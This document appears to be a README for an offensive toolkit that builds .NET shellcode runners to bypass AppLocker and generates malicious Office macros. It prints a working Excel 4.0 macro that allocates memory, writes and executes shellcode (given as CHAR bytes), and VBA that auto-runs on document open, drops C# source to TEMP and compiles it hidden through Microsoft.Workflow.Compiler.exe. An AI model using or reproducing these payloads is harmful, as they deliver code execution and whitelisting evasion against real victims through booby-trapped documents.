## Build and compile .NET payload on linux with mono
Compile a shellcode runner exe or generate source to bypass Applocker using various methods.  

### Install 
`python3 -m venv env`  
`source env/bin/activate`  
`python -m pip install pycryptodome`  
`python builder.py -inbin test.bin --arch x64 --pretty`  
Exec the resulting `out.exe` file on a windows machine.  

Requires the `mono` package.  


```
usage: builder.py [-h] [-inbin INBIN] [--arch {x86,x64}] [--outfile OUTFILE] [--type {exe,workflowcompiler,msbuild,installutil}] [--verbose VERBOSE] [--pretty PRETTY]

generate .NET executable to run AES-CBC encrypted shellcode.

optional arguments:
  -h, --help            show this help message and exit
  -inbin INBIN          .bin file
  --arch {x86,x64}
  --outfile OUTFILE
  --type {exe,workflowcompiler,msbuild,installutil}
  --verbose VERBOSE
  --pretty PRETTY
```  
  

## Using the macro helper  
Creating office macro payloads can be tedious so I created this tool to ease the burden.  
Generate source for word (2016) macro from a Program.cs.  
Generate XLM4 macro pasta given some shellcode.  
Note: only x86 (right now) and no null bytes.

Generate XLM4 macro:  
```
usage: macro_helper.py [-h] [-infile INFILE] [--outfile OUTFILE] [--filename FILENAME] [--type {word_macro,xlm4_macro}] [--exectype {shell,wmi}] [--verbose VERBOSE]

help create office macro

optional arguments:
  -h, --help            show this help message and exit
  -infile INFILE        bin file or Program.cs file depending on type
  --outfile OUTFILE
  --filename FILENAME
  --type {word_macro,xlm4_macro}
  --exectype {shell,wmi}
  --verbose VERBOSE
```

```
python3 macro_helper.py -infile test.bin --type xlm4_macro

=IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(R2C1),GOTO(R16C1))
=REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)
=Valloc(0,1000000,4096,64)
=REGISTER("Kernel32", "WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)
=SELECT(R1C2:R1000:C2,R1C2)
=SET.VALUE(R1C3,0)
=WHILE(ACTIVE.CELL()<>"END")
=WProcessMemory(-1,R3C1+R1C3*255,ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)
=SET.VALUE(R1C3,R1C3+1)
=SELECT(,"R[1]C")
=NEXT()
=REGISTER("Kernel32","CreateThread","JJJJJJJ","Cthread",,1,9)
=Cthread(0,0,R3C1,0,0,0)
=REGISTER("Kernel32","VirtualProtect","JJJJJ","Vprotect",,1,9)
=Vprotect(R3C1,4096,4,0)
=HALT()

=CHAR(0xfc),&CHAR(0x48),&CHAR(0x83),&CHAR(0xe4),&CHAR(0xf0),&CHAR(0xe8),&CHAR(0xc0),&CHAR(0x0),&CHAR(0x0),&CHAR(0x0),&CHAR(0x41),&CHAR(0x51),&CHAR(0x41),&CHAR(0x50),&CHAR(0x52),&CHAR(0x51),&CHAR(0x56),&CHAR(0x48),&CHAR(0x31),&CHAR(0xd2),&CHAR(0x65),&CHAR(0x48),&CHAR(0x8b),&CHAR(0x52),&CHAR(0x60),&CHAR(0x48),&CHAR(0x8b),&CHAR(0x52),&CHAR(0x18),&CHAR(0x48),&CHAR(0x8b),&CHAR(0x52),&CHAR(0x20),&CHAR(0x48),&CHAR(0x8b),&CHAR(0x72),&CHAR(0x50),&CHAR(0x48),&CHAR(0xf),&CHAR(0xb7),&CHAR(0x4a),&CHAR(0x4a),&CHAR(0x4d),&CHAR(0x31),&CHAR(0xc9),&CHAR(0x48),&CHAR(0x31),&CHAR(0xc0),&CHAR(0xac),&CHAR(0x3c),&CHAR(0x61),&CHAR(0x7c),&CHAR(0x2),&CHAR(0x2c),&CHAR(0x20),&CHAR(0x41),&CHAR(0xc1),&CHAR(0xc9),&CHAR(0xd),&CHAR(0x41),&CHAR(0x1),&CHAR(0xc1),&CHAR(0xe2),&CHAR(0xed),&CHAR(0x52),&CHAR(0x41),&CHAR(0x51),&CHAR(0x48),&CHAR(0x8b),&CHAR(0x52),&CHAR(0x20),&CHAR(0x8b),&CHAR(0x42),&CHAR(0x3c),&CHAR(0x48),&CHAR(0x1),&CHAR(0xd0),&CHAR(0x8b),&CHAR(0x80),&CHAR(0x88),&CHAR(0x0),&CHAR(0x0),&CHAR(0x0),&CHAR(0x48),&CHAR(0x85),&CHAR(0xc0),&CHAR(0x74),&CHAR(0x67),&CHAR(0x48),&CHAR(0x1),&CHAR(0xd0),&CHAR(0x50),&CHAR(0x8b),&CHAR(0x48),&CHAR(0x18),&CHAR(0x44),&CHAR(0x8b),&CHAR(0x40),&CHAR(0x20),&CHAR(0x49),&CHAR(0x1),&CHAR(0xd0),&CHAR(0xe3),&CHAR(0x56),&CHAR(0x48),&CHAR(0xff),&CHAR(0xc9),&CHAR(0x41),&CHAR(0x8b),&CHAR(0x34),&CHAR(0x88),&CHAR(0x48),&CHAR(0x1),&CHAR(0xd6),&CHAR(0x4d),&CHAR(0x31),&CHAR(0xc9),&CHAR(0x48),&CHAR(0x31),&CHAR(0xc0),&CHAR(0xac),&CHAR(0x41),&CHAR(0xc1),&CHAR(0xc9),&CHAR(0xd),&CHAR(0x41),&CHAR(0x1),&CHAR(0xc1),&CHAR(0x38),&CHAR(0xe0),&CHAR(0x75),&CHAR(0xf1),&CHAR(0x4c),&CHAR(0x3),&CHAR(0x4c),&CHAR(0x24),&CHAR(0x8),&CHAR(0x45),&CHAR(0x39),&CHAR(0xd1),&CHAR(0x75),&CHAR(0xd8),&CHAR(0x58),&CHAR(0x44),&CHAR(0x8b),&CHAR(0x40),&CHAR(0x24),&CHAR(0x49),&CHAR(0x1),&CHAR(0xd0),&CHAR(0x66),&CHAR(0x41),&CHAR(0x8b),&CHAR(0xc),&CHAR(0x48),&CHAR(0x44),&CHAR(0x8b),&CHAR(0x40),&CHAR(0x1c),&CHAR(0x49),&CHAR(0x1),&CHAR(0xd0),&CHAR(0x41),&CHAR(0x8b),&CHAR(0x4),&CHAR(0x88),&CHAR(0x48),&CHAR(0x1),&CHAR(0xd0),&CHAR(0x41),&CHAR(0x58),&CHAR(0x41),&CHAR(0x58),&CHAR(0x5e),&CHAR(0x59),&CHAR(0x5a),&CHAR(0x41),&CHAR(0x58),&CHAR(0x41),&CHAR(0x59),&CHAR(0x41),&CHAR(0x5a),&CHAR(0x48),&CHAR(0x83),&CHAR(0xec),&CHAR(0x20),&CHAR(0x41),&CHAR(0x52),&CHAR(0xff),&CHAR(0xe0),&CHAR(0x58),&CHAR(0x41),&CHAR(0x59),&CHAR(0x5a),&CHAR(0x48),&CHAR(0x8b),&CHAR(0x12),&CHAR(0xe9),&CHAR(0x57),&CHAR(0xff),&CHAR(0xff),&CHAR(0xff),&CHAR(0x5d),&CHAR(0x48),&CHAR(0xba),&CHAR(0x1),&CHAR(0x0),&CHAR(0x0),&CHAR(0x0),&CHAR(0x0),&CHAR(0x0),&CHAR(0x0),&CHAR(0x0),&CHAR(0x48),&CHAR(0x8d),&CHAR(0x8d),&CHAR(0x1),&CHAR(0x1),&CHAR(0x0),&CHAR(0x0),&CHAR(0x41),&CHAR(0xba),&CHAR(0x31),&CHAR(0x8b),&CHAR(0x6f),&CHAR(0x87),&CHAR(0xff),&CHAR(0xd5),&CHAR(0xbb),&CHAR(0xf0),&CHAR(0xb5),&CHAR(0xa2),&CHAR(0x56),&CHAR(0x41),&CHAR(0xba),&CHAR(0xa6),&CHAR(0x95),&CHAR(0xbd),&CHAR(0x9d),&CHAR(0xff),&CHAR(0xd5),&CHAR(0x48),&CHAR(0x83),&CHAR(0xc4),&CHAR(0x28),&CHAR(0x3c),&CHAR(0x6),&CHAR(0x7c),&CHAR(0xa),&CHAR(0x80),&CHAR(0xfb),&CHAR(0xe0),&CHAR(0x75),&CHAR(0x5)

=CHAR(0xbb),&CHAR(0x47),&CHAR(0x13),&CHAR(0x72),&CHAR(0x6f),&CHAR(0x6a),&CHAR(0x0),&CHAR(0x59),&CHAR(0x41),&CHAR(0x89),&CHAR(0xda),&CHAR(0xff),&CHAR(0xd5),&CHAR(0x43),&CHAR(0x3a),&CHAR(0x5c),&CHAR(0x57),&CHAR(0x69),&CHAR(0x6e),&CHAR(0x64),&CHAR(0x6f),&CHAR(0x77),&CHAR(0x73),&CHAR(0x5c),&CHAR(0x53),&CHAR(0x79),&CHAR(0x73),&CHAR(0x74),&CHAR(0x65),&CHAR(0x6d),&CHAR(0x33),&CHAR(0x32),&CHAR(0x5c),&CHAR(0x6e),&CHAR(0x6f),&CHAR(0x74),&CHAR(0x65),&CHAR(0x70),&CHAR(0x61),&CHAR(0x64),&CHAR(0x2e),&CHAR(0x65),&CHAR(0x78),&CHAR(0x65),&CHAR(0x0),&CHAR(0x0)
```

## Generate vba for office  

```
python3 macro_helper.py -infile Program.cs

Function writeTestDotTXT()
  strPath = Environ("TEMP") + "\brax.txt"
  Dim fso As Object
  Set fso = CreateObject("Scripting.FileSystemObject")
  Dim oFile As Object
  Set oFile = fso.CreateTextFile(strPath)
  oFile.WriteLine "using System;"
  oFile.WriteLine "using System.Runtime.InteropServices;"
  oFile.WriteLine "using System.Security.Cryptography;"
  oFile.WriteLine "using System.IO;"
  oFile.WriteLine "namespace ze"
  oFile.WriteLine "{"
  oFile.WriteLine "    class Program"
  oFile.WriteLine "    {"
  oFile.WriteLine "        [StructLayout(LayoutKind.Sequential)]"
  oFile.WriteLine "        public struct SECT_DATA"
  oFile.WriteLine "        {"
  oFile.WriteLine "            public Boolean isvalid;"

  <SNIP>

  writeRunDotXML
  tt = Environ("TEMP") +  "\brax.txt"
  rx = Environ("TEMP") +  "\run.xml"
  rs = Environ("TEMP") + "\res"
  Shell "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe " + rx + " " + rs, vbHide
End Function
  

Sub Document_Open()
  bypass
End Sub
Sub AutoOpen()
  bypass
End Sub
```